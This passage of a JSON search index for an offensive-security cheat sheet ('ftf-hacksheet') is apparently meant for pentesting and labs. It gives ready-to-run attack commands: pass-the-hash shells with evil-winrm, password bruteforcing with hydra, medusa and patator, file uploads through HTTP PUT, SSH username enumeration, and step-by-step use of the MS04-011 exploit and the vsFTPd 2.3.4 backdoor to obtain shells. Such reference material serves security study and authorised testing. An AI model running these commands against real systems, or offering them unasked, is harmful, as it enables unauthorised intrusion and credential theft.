    "url": "http://localhost:4000/#protocols--kerberos--as-rep-roasting--getnpusers",
    "relUrl": "/#protocols--kerberos--as-rep-roasting--getnpusers"
  },"114": {
    "doc": "ftf-hacksheet",
    "title": "GetADUsers",
    "content": ". | Site (Impacket) - List all usernames:GetADUsers -all -dc-ip &lt;ip&gt; &lt;domain&gt;/&lt;usr&gt;:&lt;pass&gt; # -hashes &lt;LM&gt;:&lt;NT&gt; - NT auth . | . ",
    "url": "http://localhost:4000/#protocols--kerberos--as-rep-roasting--getadusers",
    "relUrl": "/#protocols--kerberos--as-rep-roasting--getadusers"
  },"115": {
    "doc": "ftf-hacksheet",
    "title": "WinRM / PSRP",
    "content": " ",
    "url": "http://localhost:4000/#protocols--winrm---psrp",
    "relUrl": "/#protocols--winrm---psrp"
  },"116": {
    "doc": "ftf-hacksheet",
    "title": "evil-winrm",
    "content": ". | Site - Remote shell - Port 5985:# Check the Site for extra features evil-winrm -u '[&lt;domain&gt;\\]&lt;user&gt;' -p '&lt;pass&gt;' -i &lt;ip&gt; # Login with NTLM hash (not NTLVv2) evil-winrm -H '&lt;ntlm-hash&gt;' -i &lt;ip&gt; # -S - enable ssl # -P &lt;port&gt; - Other than 5985 port # -s &lt;path&gt; - Load local PS scripts # -e &lt;path&gt; - Load local C# exes # -U &lt;uri&gt; - URI path to /wsman # -r &lt;dom&gt; - Kerberos realm domain # upload - Upload local files # download - Download remote files # services - Show running services # menu - Show extra features: # [Dll|Donut]-loader | Invoke-Binary . | . ",
    "url": "http://localhost:4000/#protocols--winrm---psrp--evil-winrm",
    "relUrl": "/#protocols--winrm---psrp--evil-winrm"
  },"117": {
    "doc": "ftf-hacksheet",
    "title": "HTTP / HTTPS",
    "content": " ",
    "url": "http://localhost:4000/#protocols--http---https",
    "relUrl": "/#protocols--http---https"
  },"118": {
    "doc": "ftf-hacksheet",
    "title": "Enumeration",
    "content": " ",
    "url": "http://localhost:4000/#protocols--http---https--enumeration",
    "relUrl": "/#protocols--http---https--enumeration"
  },"119": {
    "doc": "ftf-hacksheet",
    "title": "Console page rendering",
    "content": " ",
    "url": "http://localhost:4000/#protocols--http---https--enumeration--console-page-rendering",
    "relUrl": "/#protocols--http---https--enumeration--console-page-rendering"
  },"120": {
    "doc": "ftf-hacksheet",
    "title": "w3m",
    "content": ". | Usage - best standalone Renderer:# Add -dump to not start pager w3m &lt;url&gt; # Use -T text/html with files # Cookies are in Netscape format HOME=/tmp w3m -cookie &lt;url&gt; # Cookies are in /tmp/.w3m/cookie # For insecure sites you may try w3m -insecure &lt;url&gt; # Or w3m -o ssl_cipher='ALL:@SECLEVEL=0' -o ssl_min_version='TLSv1.0' -o ssl_forbid_method='' -o ssl_verify_server=0 &lt;url&gt; # As a last resort pipe curl curl -s &lt;url&gt; | w3m -T text/html . | . ",
    "url": "http://localhost:4000/#protocols--http---https--enumeration--console-page-rendering--w3m",
    "relUrl": "/#protocols--http---https--enumeration--console-page-rendering--w3m"
  },"121": {
    "doc": "ftf-hacksheet",
    "title": "Browsh",
    "content": ". | Site - Renders JS - Requires Firefox:# Needs mouse support for clicks browsh &lt;url&gt; # Alt: --firefox.path \"firefox-esr\" . | Use the vim-mode experimental branch | Or install Vim-Vixen in GUI mode | . ",
    "url": "http://localhost:4000/#protocols--http---https--enumeration--console-page-rendering--browsh",
    "relUrl": "/#protocols--http---https--enumeration--console-page-rendering--browsh"
  },"122": {
    "doc": "ftf-hacksheet",
    "title": "Lynx",
    "content": ". | Preserves links:# Add -dump to not start pager lynx &lt;url&gt; # Use -force_html to force parsing . | . ",
    "url": "http://localhost:4000/#protocols--http---https--enumeration--console-page-rendering--lynx",
    "relUrl": "/#protocols--http---https--enumeration--console-page-rendering--lynx"
  },"123": {
    "doc": "ftf-hacksheet",
    "title": "html2text",
    "content": ". | C++/Python - Simple script for files:# Prettify with -style pretty html2text &lt;file&gt; . | . ",
    "url": "http://localhost:4000/#protocols--http---https--enumeration--console-page-rendering--html2text",
    "relUrl": "/#protocols--http---https--enumeration--console-page-rendering--html2text"
  },"124": {
    "doc": "ftf-hacksheet",
    "title": "Curl",
    "content": ". | Headers + body:curl -i &lt;url&gt; . | Headers only:curl -I &lt;url&gt; . | Follow redirection:curl -L &lt;url&gt; . | Connect to old SSL/TLS sites:curl -1 --ciphers 'DEFAULT:!DH' -k &lt;url&gt; . | curl --trace parser: curl-trace-parser | . ",
    "url": "http://localhost:4000/#protocols--http---https--enumeration--curl",
    "relUrl": "/#protocols--http---https--enumeration--curl"
  },"125": {
    "doc": "ftf-hacksheet",
    "title": "HTTPie",
    "content": ". | Site - Curl+Wget+JSON CLI - Docs:# GET request with parameteres http &lt;url&gt; 'q==hi' 'sort==3' # POST request URLencoded http -F -f &lt;domain-ip&gt;/&lt;path&gt; 'u=me' # -F to follow | -f use \"form mode\" # --all to show all redirects # Check request without sending it http --offline &lt;domain-ip&gt; # Upload a file (default is POST) https PUT &lt;domain-ip&gt; &lt; '&lt;file&gt;' # Perfrom LFI check http --path-as-is &lt;domain-ip&gt;/../../../etc/passwd # Response headers in JSON https -h -j &lt;domain-ip&gt; # -p Hh to print Resquest &amp; Response # Store/Use session (cookies) - JSON http --session=&lt;path&gt; &lt;domain-ip&gt; # HTTP Auth http -a &lt;user:pass&gt; &lt;domain-ip&gt; # -A basic/digest for Auth type # --proxy=&lt;method&gt;:&lt;url&gt; . | CurliPie - Convert curl to HTTPie | HTTP Prompt - Interactive HTTPie - Dochttp-prompt &lt;url&gt; &lt;httpie-options&gt; # Supports everything HTTPie does env # Show flags set cd &lt;uri&gt; # Move to parent/child URI httpie # Show what will get run rm -o * # Remove all HTTPie options post # Perform POST request rm -b * # Remove all \"body options\" # Remember: -f -F --session &lt;file&gt; # to be able to perform cd &lt;uri&gt; get | w3m -T text/html # Pipe GET env &gt; &lt;file&gt; # Save session to file source &lt;file&gt; # Load session exec &lt;file&gt; # Replace&amp;Load session # Start from session http-prompt --env &lt;session&gt; &lt;url&gt; . | . ",
    "url": "http://localhost:4000/#protocols--http---https--enumeration--httpie",
    "relUrl": "/#protocols--http---https--enumeration--httpie"
  },"126": {
    "doc": "ftf-hacksheet",
    "title": "openssl s_client",
    "content": ". | Query site:echo -ne \"GET /&lt;path&gt; HTTP/1.0\\r\\nHost: &lt;domain&gt;\\r\\n\\r\\n\" | openssl s_client -connect &lt;site&gt;:443 -verify_quiet -quiet 2&gt;/dev/null | sed -n '$G;1,/^\\s*$/!P' # For file downloading: sed '1,/^\\s*$/d' . | . ",
    "url": "http://localhost:4000/#protocols--http---https--enumeration--openssl-s_client",
    "relUrl": "/#protocols--http---https--enumeration--openssl-s_client"
  },"127": {
    "doc": "ftf-hacksheet",
    "title": "Bash",
    "content": ". | Query site:{ echo -ne \"GET /&lt;path&gt; HTTP/1.0\\r\\nHost: &lt;ip-dom&gt;\\r\\n\\r\\n\" &gt;&amp;3; sed -n '$G;1,/^\\s*$/!P' &lt;&amp;3; } 3&lt;&gt;/dev/tcp/&lt;ip-domain&gt;/80 # For file downloading: sed '1,/^\\s*$/d' . | . ",
    "url": "http://localhost:4000/#protocols--http---https--enumeration--bash",
    "relUrl": "/#protocols--http---https--enumeration--bash"
  },"128": {
    "doc": "ftf-hacksheet",
    "title": "Perl",
    "content": ". | Core Perl:# Remove $/=\"\\r\\n\"x2 to show the headers perl -MSocket -e '$\"=\",\";socket$s,2,1,6;$$_[2]=qq/pack\"$$_[2]\"/,eval\"setsockopt\\$s,@$_\"for[1,13,ii,1,5],[6,18,L,5000],map[1,$_,\"l!2\",5],20,21;connect$s,sockaddr_in+80,inet_aton$h=\"&lt;ip-host&gt;\";send$s,\"GET /&lt;path&gt; HTTP/1.0\\r\\nHost: $h\\r\\n\\r\\n\",0;$/=\"\\r\\n\"x2;&lt;$s&gt;;print&lt;$s&gt;' # If headers don't end in \\r\\n use: # 1until&lt;$s&gt;=~/^\\s*$/;print&lt;$s&gt; # # For HTTP/1.1 add Connection: close # # The first socket call is equivalent to # socket$s,PF_INET,SOCK_STREAM, # getprotobyname(\"tcp\") # Packed arrays structure: # [ &lt;Sock-Level&gt;, &lt;Level-Opt&gt;, &lt;Rest*&gt; ] # Sock-Level 1 -&gt; SOL_SOCKET # Level-Opt 13 -&gt; SO_LINGER # Level-Opt 20 -&gt; SO_RCVTIMEO # Level-Opt 21 -&gt; SO_SNDTIMEO # See man socket7,asm-generic/socket.h # Sock-Level 6 -&gt; getprotobyname(\"tcp\") # or Socket::IPPROTO_TCP # Level-Opt18 Socket::TCP_USER_TIMEOUT # See man tcp7 &amp; ip7, and linux/tcp.h . | . ",
    "url": "http://localhost:4000/#protocols--http---https--enumeration--perl",
    "relUrl": "/#protocols--http---https--enumeration--perl"
  },"129": {
    "doc": "ftf-hacksheet",
    "title": "Methods",
    "content": " ",
    "url": "http://localhost:4000/#protocols--http---https--methods",
    "relUrl": "/#protocols--http---https--methods"
  },"130": {
    "doc": "ftf-hacksheet",
    "title": "Identification",
    "content": ". | Use Nmap NSE http-methods:# Select path: http-methods.url-path nmap --script=http-methods # Unsafe args: http-methods.test-all # Individually: http-methods.retest . | Different directories may support different methods:# See first the helpers below while read p; do nmap -sT -n -Pn -T4 --min-rate=1000 --script=http-methods --script-args=http-methods.test-all,http-methods.url-path=\"/$p/\" -p&lt;port&gt; &lt;ip&gt;; done &lt; \"&lt;path-list&gt;\" . | Trim the domain from the URLs:sed -n 's, *https\\?://[^/]*/,,p' \"&lt;path-list&gt;\" &gt; trim.paths . | Generate all the intermediary paths:sed -n 's,/$,,;:a;p;s,/[^/]*$,,;ta' trim.paths | sort -u &gt; all.paths . | . ",
    "url": "http://localhost:4000/#protocols--http---https--methods--identification",
    "relUrl": "/#protocols--http---https--methods--identification"
  },"131": {
    "doc": "ftf-hacksheet",
    "title": "PUT",
    "content": " ",
    "url": "http://localhost:4000/#protocols--http---https--methods--put",
    "relUrl": "/#protocols--http---https--methods--put"
  },"132": {
    "doc": "ftf-hacksheet",
    "title": "Notes",
    "content": ". | Sites may deny files with specific extensions like .php but not .php5 | . ",
    "url": "http://localhost:4000/#protocols--http---https--methods--put--notes",
    "relUrl": "/#protocols--http---https--methods--put--notes"
  },"133": {
    "doc": "ftf-hacksheet",
    "title": "Check All Subdirs",
    "content": ". | Assume you have a file with full URLs# Without trailing slash: $,/, -&gt; $,, sed 's, *https\\?://,,;:a;s,/[^/]\\+/\\?$,/,p;ta' furls.txt | sort -u | httprobe &gt; sdirs.txt # Alternative using Zsh builtins while read f; do while ! [[ \"$f\" =~ \".*&lt;site.com&gt;/$\" ]]; do f=\"${f:h}/\"; echo \"$f\"; done; done &lt; furls.txt | sort -u &gt; sdirs.txt . | Probe each subdir with curl:while read u; do while :; do { timeout 3 curl -ski -X OPTIONS \"$u\" 2&gt;&amp;1 || continue; } | { grep -v '^$' || continue; } | { grep -o '.*\\&lt;PUT\\&gt;' | sed \"i[$u]\"$'\\na\\n'; }; break; done; done &lt; sdirs.txt # Might require GNU sed . | . ",
    "url": "http://localhost:4000/#protocols--http---https--methods--put--check-all-subdirs",
    "relUrl": "/#protocols--http---https--methods--put--check-all-subdirs"
  },"134": {
    "doc": "ftf-hacksheet",
    "title": "Nmap",
    "content": ". | Use NSE http-put to upload files:# Redirection cause false positives nmap -sS -n -Pn -T4 --min-rate=1000 --script=http-put --script-args=http-put.url=\"&lt;dest-file-path&gt;\",http-put.file=\"&lt;local-file-path&gt;\" -p&lt;port&gt; &lt;ip&gt; # Use the Identificaton for loop while read p; do nmap -sT -n -Pn -T4 --min-rate=1000 --script=http-put --script-args=http-put.url=\"/$p/&lt;file.ext&gt;\",http-put.file=\"&lt;local-file-path&gt;\" -p&lt;port&gt; &lt;ip&gt;; done &lt; &lt;fpaths&gt; 2&gt;&amp;1 | grep \"successfully\" . | . ",
    "url": "http://localhost:4000/#protocols--http---https--methods--put--nmap",
    "relUrl": "/#protocols--http---https--methods--put--nmap"
  },"135": {
    "doc": "ftf-hacksheet",
    "title": "Curl",
    "content": ". | Usage:curl -i 'Content-Type: text/plain; charset=utf-8' -T \"&lt;local-file-path&gt;\" http://&lt;ip&gt;/&lt;dir&gt; . | . ",
    "url": "http://localhost:4000/#protocols--http---https--methods--put--curl",
    "relUrl": "/#protocols--http---https--methods--put--curl"
  },"136": {
    "doc": "ftf-hacksheet",
    "title": "GET",
    "content": " ",
    "url": "http://localhost:4000/#protocols--http---https--methods--get",
    "relUrl": "/#protocols--http---https--methods--get"
  },"137": {
    "doc": "ftf-hacksheet",
    "title": "Wget",
    "content": ". | Download all files recursively:# Don't recurse to the parent wget --no-parent -r &lt;url/path&gt; # and don't download index files wget --no-parent --reject \"index*\" -r &lt;url/path&gt; . | . ",
    "url": "http://localhost:4000/#protocols--http---https--methods--get--wget",
    "relUrl": "/#protocols--http---https--methods--get--wget"
  },"138": {
    "doc": "ftf-hacksheet",
    "title": "Headers",
    "content": " ",
    "url": "http://localhost:4000/#protocols--http---https--headers",
    "relUrl": "/#protocols--http---https--headers"
  },"139": {
    "doc": "ftf-hacksheet",
    "title": "Keep-Alive",
    "content": ". | Used for persistent connections | Can be used to bypass WAF TCP connection limits and DoS | Check if the server supports it:curl -H 'Connection: keep-alive' -I . | Test it with curl:curl -v \"&lt;url&gt;\" \"&lt;same-url&gt;\" . | . ",
    "url": "http://localhost:4000/#protocols--http---https--headers--keep-alive",
    "relUrl": "/#protocols--http---https--headers--keep-alive"
  },"140": {
    "doc": "ftf-hacksheet",
    "title": "Bruteforce",
    "content": " ",
    "url": "http://localhost:4000/#protocols--http---https--bruteforce",
    "relUrl": "/#protocols--http---https--bruteforce"
  },"141": {
    "doc": "ftf-hacksheet",
    "title": "Forms",
    "content": " ",
    "url": "http://localhost:4000/#protocols--http---https--bruteforce--forms",
    "relUrl": "/#protocols--http---https--bruteforce--forms"
  },"142": {
    "doc": "ftf-hacksheet",
    "title": "Dynamic CSRF / OAuth Token Protection Bypass",
    "content": " ",
    "url": "http://localhost:4000/#protocols--http---https--bruteforce--forms--dynamic-csrf---oauth-token-protection-bypass",
    "relUrl": "/#protocols--http---https--bruteforce--forms--dynamic-csrf---oauth-token-protection-bypass"
  },"143": {
    "doc": "ftf-hacksheet",
    "title": "Tools",
    "content": ". | patator is able to do it but might not be the most efficient if the server allows reusing the CSRF token a few times | wfuzz is also able to do it (and efficiently) via its python library using FuzzSession and modifying the .fuzz() parameters via the Result Object | . ",
    "url": "http://localhost:4000/#protocols--http---https--bruteforce--forms--dynamic-csrf---oauth-token-protection-bypass--tools",
    "relUrl": "/#protocols--http---https--bruteforce--forms--dynamic-csrf---oauth-token-protection-bypass--tools"
  },"144": {
    "doc": "ftf-hacksheet",
    "title": "Proxies",
    "content": ". | All the other bruteforcers can obtain this feature via a proxy | Burp Suite is able to do it although not in the most efficient way if the server allows reusing CSRF tokens a few times | Mitmproxy is also able to do it (and efficiently) by checking for CSRF errors in the response, saving the CSRF token &amp; repeating the request - see OAuth sample | . ",
    "url": "http://localhost:4000/#protocols--http---https--bruteforce--forms--dynamic-csrf---oauth-token-protection-bypass--proxies",
    "relUrl": "/#protocols--http---https--bruteforce--forms--dynamic-csrf---oauth-token-protection-bypass--proxies"
  },"145": {
    "doc": "ftf-hacksheet",
    "title": "Hydra",
    "content": ". | Site - Multi-protocol bruteforcer:# [!] Don't add http:// to &lt;ip&gt; # Use -S for SSL or -O -&gt; older SSL # Single user bruteforce hydra -l &lt;usr&gt; -P &lt;wordlist&gt; -f -e ns -s &lt;port&gt; &lt;ip&gt; http-post-form '/path/to/form:user=&lt;user&gt;&amp;password=^PASS^:Invalid Password!' # -f -&gt; exits when finding 1 combo # Form fields: user and password # &lt;user&gt;&amp;&lt;pass&gt; taken from request # ^PASS^ is replaced by &lt;wlist&gt; # :F=\"Invalid Password!\" if failure # Use :S=&lt;success-str&gt; otherwise # :A=(BASIC|NTLM|MD5) to set auth # :H=My\\: Header to set headers # More info: hydra -U http-post . | Only ^USER^/^PASS^ get URL-encoded (ref), escape non-delimiter colons | Hydra doesn&#8217;t like named pipes as wordlists, use zsh =() temp files | JSON/AJAX forms require headers (ref):# JSON fields need double quotes hydra -L &lt;userwl&gt; -P &lt;passwl&gt; -e ns -s &lt;port&gt; &lt;ip&gt; http-post-form '/path/to/api/auth:{\"user\"\\:\"^USER^\",\"pass\"\\:\"^PASS^\"}:{\"success\"\\:false}:H=Content-Type\\: application/json;charset=utf-8' # Add -u for spraying # Use curl's resp-body as Fail-cond # If more headers are required, do # escape : from the url http\\:// . | For JSON/AJAX use the latest master as there are two bugs in version &lt; 9.3 | . ",
    "url": "http://localhost:4000/#protocols--http---https--bruteforce--forms--hydra",
    "relUrl": "/#protocols--http---https--bruteforce--forms--hydra"
  },"146": {
    "doc": "ftf-hacksheet",
    "title": "Basic / Digest / NTLM",
    "content": " ",
    "url": "http://localhost:4000/#protocols--http---https--bruteforce--basic---digest---ntlm",
    "relUrl": "/#protocols--http---https--bruteforce--basic---digest---ntlm"
  },"147": {
    "doc": "ftf-hacksheet",
    "title": "Medusa",
    "content": ". | Site - Repo (fix) - Login bruteforcer# Unable to filter codes/redirs medusa -h &lt;ip/dom&gt; -v 4 -b -M http -m \"AUTH:BASIC\" -m 'DIR:/&lt;url&gt;' -s -t 2 -e ns -U &lt;wusr&gt; -P &lt;wpwd&gt; # -v 4 - See successful only # -b - Hide banner # -t &lt;num&gt; - Thread number # -T &lt;num&gt; - Concurrent hosts # -M &lt;module&gt; - Choose module # -m &lt;param&gt; - Module parameter # -s - Use SSL # -n &lt;port&gt; - Different port # -Z &lt;key&gt; - Resume using key # -e [ns] - Try Null/Same usr-&gt;pwd # -[up] &lt;single-usr/pass&gt; # -[Ff] - 1 valid combo Any/1 host # -H &lt;host-list&gt; | -C &lt;combo-list&gt; # -d - * Modules | -q - All params . | . ",
    "url": "http://localhost:4000/#protocols--http---https--bruteforce--basic---digest---ntlm--medusa",
    "relUrl": "/#protocols--http---https--bruteforce--basic---digest---ntlm--medusa"
  },"148": {
    "doc": "ftf-hacksheet",
    "title": "Ffuf",
    "content": ". | Adapt ffuf_basicauth from ffuf-scripts:# Change to Digest or NTLM if needed ./ffuf_basicauth.sh &lt;wusr&gt; &lt;pwd&gt; | ffuf -w -:AUTH -H \"Authorization: Basic AUTH\" -fc 403 -c -u '&lt;url&gt;' . | . ",
    "url": "http://localhost:4000/#protocols--http---https--bruteforce--basic---digest---ntlm--ffuf",
    "relUrl": "/#protocols--http---https--bruteforce--basic---digest---ntlm--ffuf"
  },"149": {
    "doc": "ftf-hacksheet",
    "title": "Patator",
    "content": ". | Site - Multi-Purpose bruteforcer - raw# Add to line 3965: if resolve: patator http_fuzz 'url=&lt;url&gt;' user_pass=FILE0:FILE1 0='&lt;wusr&gt;' 1='&lt;wpwd&gt;' -x ignore:code=401 # pathasis=1 - Send ../ as is # auth_type=basic - Default # auto_urlencode=1 - Default # persistent=1 - Default # &gt; Change the 0 and 1 for spraying # # --allow-ignore-failures - Ignore... # -x ignore:code=xxx - Errors . | . ",
    "url": "http://localhost:4000/#protocols--http---https--bruteforce--basic---digest---ntlm--patator",
    "relUrl": "/#protocols--http---https--bruteforce--basic---digest---ntlm--patator"
  },"150": {
    "doc": "ftf-hacksheet",
    "title": "RPC",
    "content": " ",
    "url": "http://localhost:4000/#protocols--rpc",
    "relUrl": "/#protocols--rpc"
  },"151": {
    "doc": "ftf-hacksheet",
    "title": "MS04-011",
    "content": ". | Used in Windows XP, also works in Win2k | Check that the port 445 is open and that the lsass.exe (WinXP) or netrap.dll (Win2k) processes are running | Obtain the exploit through searchsploit -m 295 or exploit-db | Add #include &lt;stdio.h&gt; | Compile it with:i686-w64-mingw32-gcc 295.c -o ms04-011.exe -lws2_32 . | Send it to the target an run it::: 0 -&gt; WinXP ; 1/2 -&gt; Win2k Pro/Serv ms04-011.exe 0 127.0.0.1 9090 . | Connect to the port 9090 (locally) to obtain an admin shell | There are some options for autodetect the OS (-t) and connect back to an IP (reverse-shell) instead of spawning the bind-shell but they weren&#8217;t tested | . ",
    "url": "http://localhost:4000/#protocols--rpc--ms04-011",
    "relUrl": "/#protocols--rpc--ms04-011"
  },"152": {
    "doc": "ftf-hacksheet",
    "title": "FTP",
    "content": " ",
    "url": "http://localhost:4000/#protocols--ftp",
    "relUrl": "/#protocols--ftp"
  },"153": {
    "doc": "ftf-hacksheet",
    "title": "Enumeration",
    "content": " ",
    "url": "http://localhost:4000/#protocols--ftp--enumeration",
    "relUrl": "/#protocols--ftp--enumeration"
  },"154": {
    "doc": "ftf-hacksheet",
    "title": "Netcat",
    "content": ". | Banner grab and interact:nc -nv &lt;ip&gt; 21 . | Commands:# Log in USER &lt;username&gt; PASS &lt;password&gt; # The order may have to be reversed . | . ",
    "url": "http://localhost:4000/#protocols--ftp--enumeration--netcat",
    "relUrl": "/#protocols--ftp--enumeration--netcat"
  },"155": {
    "doc": "ftf-hacksheet",
    "title": "FTP",
    "content": ". | Connect:ftp &lt;ip&gt; # Use anonymous as name to anon user . | Commands:# OS (more or less system # Current path pwd # List files ls / dir # Change directory cd &lt;dir&gt; # Delete file del &lt;file&gt; # Set binary mode for transfers binary # Download get &lt;file&gt; # Upload put &lt;local-file&gt; . | . ",
    "url": "http://localhost:4000/#protocols--ftp--enumeration--ftp",
    "relUrl": "/#protocols--ftp--enumeration--ftp"
  },"156": {
    "doc": "ftf-hacksheet",
    "title": "Backdoors",
    "content": " ",
    "url": "http://localhost:4000/#protocols--ftp--backdoors",
    "relUrl": "/#protocols--ftp--backdoors"
  },"157": {
    "doc": "ftf-hacksheet",
    "title": "vsFTPd 2.3.4",
    "content": ". | Trigger: Username ending in :):nc -nv &lt;ip&gt; &lt;ftp-port&gt; USER test:) PASS test . | Connect to backdoor:nc -nv &lt;ip&gt; 6200 # Will only work if the firewall is # not blocking it # Note that it may still be the way # to elevate privileges from inside . | . ",
    "url": "http://localhost:4000/#protocols--ftp--backdoors--vsftpd-2-3-4",
    "relUrl": "/#protocols--ftp--backdoors--vsftpd-2-3-4"
  },"158": {
    "doc": "ftf-hacksheet",
    "title": "SSH",
    "content": " ",
    "url": "http://localhost:4000/#protocols--ssh",
    "relUrl": "/#protocols--ssh"
  },"159": {
    "doc": "ftf-hacksheet",
    "title": "Bruteforce",
    "content": " ",
    "url": "http://localhost:4000/#protocols--ssh--bruteforce",
    "relUrl": "/#protocols--ssh--bruteforce"
  },"160": {
    "doc": "ftf-hacksheet",
    "title": "Usernames",
    "content": ". | Using EID 45939 and xargs:&lt; &lt;userlist&gt; xargs -P 10 -I {} python2 45939.py -p &lt;port&gt; &lt;ip&gt; {} 2&gt;&amp;1 | grep ' valid' # Unlimited procs kill the process . | . ",
    "url": "http://localhost:4000/#protocols--ssh--bruteforce--usernames",
    "relUrl": "/#protocols--ssh--bruteforce--usernames"
  },"161": {
    "doc": "ftf-hacksheet",
    "title": "Passwords",
    "content": " ",
    "url": "http://localhost:4000/#protocols--ssh--bruteforce--passwords",
    "relUrl": "/#protocols--ssh--bruteforce--passwords"
  },"162": {
    "doc": "ftf-hacksheet",
    "title": "Hydra",
    "content": ". | Site - Multi-protocol bruteforcer:# -s &lt;alt-port&gt; hydra -l &lt;user&gt; -P &lt;pass-wlist&gt; -e ns ssh://&lt;server&gt; . | . ",
    "url": "http://localhost:4000/#protocols--ssh--bruteforce--passwords--hydra",
    "relUrl": "/#protocols--ssh--bruteforce--passwords--hydra"
  },"163": {
    "doc": "ftf-hacksheet",
    "title": "Shellshock - CVE-2014-6271",
    "content": ". | OpenSSH with ForceCommand feature and bash &lt; bash43-027 | . ",
    "url": "http://localhost:4000/#protocols--ssh--shellshock---cve-2014-6271",
    "relUrl": "/#protocols--ssh--shellshock---cve-2014-6271"
  },"164": {
    "doc": "ftf-hacksheet",
    "title": "CVE-2015-6565",
    "content": " ",
    "url": "http://localhost:4000/#protocols--ssh--cve-2015-6565",
    "relUrl": "/#protocols--ssh--cve-2015-6565"
  },"165": {
    "doc": "ftf-hacksheet",
    "title": "Affected",
    "content": ". | OpenSSH 6.8 &lt; 6.9 | . ",
    "url": "http://localhost:4000/#protocols--ssh--cve-2015-6565--affected",
    "relUrl": "/#protocols--ssh--cve-2015-6565--affected"
  },"166": {
    "doc": "ftf-hacksheet",
    "title": "Exploit",
    "content": ". | EID 41173 - Local privEsc | . ",
    "url": "http://localhost:4000/#protocols--ssh--cve-2015-6565--exploit",
    "relUrl": "/#protocols--ssh--cve-2015-6565--exploit"
  },"167": {
    "doc": "ftf-hacksheet",
    "title": "CVE-2008-0166",
    "content": " ",
    "url": "http://localhost:4000/#protocols--ssh--cve-2008-0166",
    "relUrl": "/#protocols--ssh--cve-2008-0166"
  },"168": {
    "doc": "ftf-hacksheet",
    "title": "Affected",
    "content": ". | SSH with OpenSSL 0.9.8c-1 &lt; 0.9.8g-9 | . ",
    "url": "http://localhost:4000/#protocols--ssh--cve-2008-0166--affected",
    "relUrl": "/#protocols--ssh--cve-2008-0166--affected"
  },"169": {
    "doc": "ftf-hacksheet",
    "title": "Readable .ssh/authorized_keys",
    "content": ". | Get DSA or RSA common keys | Grep for the authorized key:grep -lr &lt;auth-key&gt; # .pub file detected . | Connect using the found private file:ssh -i &lt;non.pub&gt; &lt;user&gt;@&lt;ip&gt; . | . ",
    "url": "http://localhost:4000/#protocols--ssh--cve-2008-0166--readable--ssh-authorized_keys",
    "relUrl": "/#protocols--ssh--cve-2008-0166--readable--ssh-authorized_keys"
  },"170": {
    "doc": "ftf-hacksheet",
    "title": "Other tools",
    "content": ". | Check debian-ssh and our_tools dir | . ",
    "url": "http://localhost:4000/#protocols--ssh--cve-2008-0166--other-tools",
    "relUrl": "/#protocols--ssh--cve-2008-0166--other-tools"
  },"171": {
    "doc": "ftf-hacksheet",
    "title": "Tricky Commands/Configuration",
    "content": " ",
    "url": "http://localhost:4000/#protocols--ssh--tricky-commands-configuration",
    "relUrl": "/#protocols--ssh--tricky-commands-configuration"
  },"172": {
    "doc": "ftf-hacksheet",
    "title": "POSIX Remote Directory Tracking",
    "content": ". | Vterm codes:# Paste as-is in a remote terminal # command ssh -F /dev/null &lt;host&gt;; cd . [ -n \"${IP+x}\" ] &amp;&amp; OLD_IP=\"$IP\" IP=\"$(expr \"${SSH_CONNECTION}\" : \".* \\([^ ]*\\) 22\")\" # Add others like pushd popd if used for c in cd chdir; do eval $c' () { { command '$c' $@; } &amp;&amp; { printf \"\\e]51;A-:${USER}@'${IP}':%s\\e\\\\\" \"${PWD}\"; :; } }' done [ -z \"${OLD_IP+x}\" ] &amp;&amp; unset IP || { IP=\"${OLD_IP}\"; unset OLD_IP; } cd . # Tmux escape: \\ePtmux;\\e\\e]%s\\007\\e\\\\ # Screen escape: \\eP\\e]%s\\007\\e\\\\ . | . ",
    "url": "http://localhost:4000/#protocols--ssh--tricky-commands-configuration--posix-remote-directory-tracking",
    "relUrl": "/#protocols--ssh--tricky-commands-configuration--posix-remote-directory-tracking"
  },"173": {
    "doc": "ftf-hacksheet",
    "title": "PLINK.exe",
    "content": ". | Connect to host:: Inline password with -pw &lt;pass&gt; :: Different port with -P &lt;port&gt; plink.exe -ssh root@127.0.0.1 . | Proxy through SOCKS4/HTTP (ref):plink.exe -ssh -proxycmd \"ncat --proxy-type http --proxy &lt;proxy-ip&gt;:&lt;proxy-port&gt; %host %port\" root@127.0.0.1 . | . ",
    "url": "http://localhost:4000/#protocols--ssh--tricky-commands-configuration--plink-exe",
    "relUrl": "/#protocols--ssh--tricky-commands-configuration--plink-exe"
  },"174": {
    "doc": "ftf-hacksheet",
    "title": "PUTTY.exe",
    "content": ". | SSH proxy-hopping - How to | . ",
    "url": "http://localhost:4000/#protocols--ssh--tricky-commands-configuration--putty-exe",
    "relUrl": "/#protocols--ssh--tricky-commands-configuration--putty-exe"
  },"175": {
    "doc": "ftf-hacksheet",
    "title": "SSH",
    "content": ". | List keys associated to private one:ssh-keygen -l -f &lt;r/dsa&gt; . | Create public file from private:ssh-keygen -y -f &lt;r/dsa&gt; &gt; &lt;r/dsa&gt;.pub . | Set the right permissions to use with -i# Or 400 chmod 600 &lt;r/dsa&gt;.pub . | Export (to stdout) key in PEM format:ssh-keygen -e -m PEM -f &lt;r/dsa&gt; . | Find the options that are/can be set:ssh -G -o &lt;options&gt; root@127.0.0.1 . | Ignore ssh_config and allow weaker algorithms:ssh -i &lt;private-rsa/dsa&gt; -p &lt;port&gt; -F /dev/null -o PreferredAuthentications=password -o PubkeyAuthentication=no -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -oKexAlgorithms=+diffie-hellman-group1-sha1 -ociphers=+aes128-cbc root@127.0.0.1 . | Proxy through SOCKS5 (ref):# Using OpenBSD nc ssh -o ProxyCommand='/usr/bin/nc -X 5 -x &lt;proxy-ip&gt;:&lt;proxy-port&gt; %h %p' &lt;user&gt;@&lt;ip&gt; # Using ncat ssh -o ProxyCommand='/usr/bin/ncat --proxy-type socks5 --proxy &lt;proxy-ip&gt;:&lt;proxy-port&gt; %h %p' &lt;user&gt;@&lt;ip&gt; . | SSH-hopping:ssh -J &lt;user-hop1&gt;@&lt;ip-hop1&gt; &lt;user&gt;@&lt;ip&gt; . | SSH Control Sequences (ref):# Only works after newlines # Disable: ssh -o EscapeChar='none' ~~ # Send Escape ~. # Terminate connection ~^Z # Background ssh (Ctrl-Z) ~C # Add commands: -D &lt;socks-port&gt; . | . ",
    "url": "http://localhost:4000/#protocols--ssh--tricky-commands-configuration--ssh",
    "relUrl": "/#protocols--ssh--tricky-commands-configuration--ssh"
  },"176": {
    "doc": "ftf-hacksheet",
    "title": "Distcc",
    "content": " ",
    "url": "http://localhost:4000/#protocols--distcc",
    "relUrl": "/#protocols--distcc"
  },"177": {
